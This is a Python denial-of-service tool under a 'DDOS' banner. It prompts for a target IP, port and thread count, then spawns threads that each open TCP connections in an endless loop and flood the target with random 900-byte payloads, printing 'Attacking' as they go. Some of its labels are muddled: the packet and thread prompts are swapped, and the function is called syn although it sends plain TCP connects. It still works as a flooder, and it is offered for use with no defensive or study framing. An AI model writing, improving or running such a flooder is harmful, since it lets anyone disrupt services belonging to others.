import random
import threading
import socket
import os
import time
os.system('cls')
print("""
8 888888888o.      8 888888888o.          ,o888888o.       d888888o.   
8 8888    `^888.   8 8888    `^888.    . 8888     `88.   .`8888:' `88. 
8 8888        `88. 8 8888        `88. ,8 8888       `8b  8.`8888.   Y8 
8 8888         `88 8 8888         `88 88 8888        `8b `8.`8888.     
8 8888          88 8 8888          88 88 8888         88  `8.`8888.    
8 8888          88 8 8888          88 88 8888         88   `8.`8888.   
8 8888         ,88 8 8888         ,88 88 8888        ,8P    `8.`8888.  
8 8888        ,88' 8 8888        ,88' `8 8888       ,8P 8b   `8.`8888. 
8 8888    ,o88P'   8 8888    ,o88P'    ` 8888     ,88'  `8b.  ;8.`8888 
8 888888888P'      8 888888888P'          `8888888P'     `Y8888P ,88P' """
)
ip = str(input("[+] IP: "))
port = int(input("[+] Port: "))
thread = int(input("[+] Packets: "))
packet = int(input("[+] Threads: "))
time.sleep(1.5)
os.system('cls')
print("""         _   _             _    _             
    /\  | | | |           | |  (_)            
   /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
  / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
 / ____ \ |_| || (_| | (__|   <| | | | | (_| |
/_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                         __/ |
                                        |___/ """)
print("[+] Start......")
time.sleep(2)
print("\n3")
time.sleep(1)
print("\n2")
time.sleep(1)
print("\n1")
time.sleep(1)
os.system('cls')
def syn():
    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb +=1
            print('[+] Attacking '+ip +'>>>Sent: '+str(bb))
        except KeyboardInterrupt:
            h.close()
            print("DONE !!!")
            pass
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()


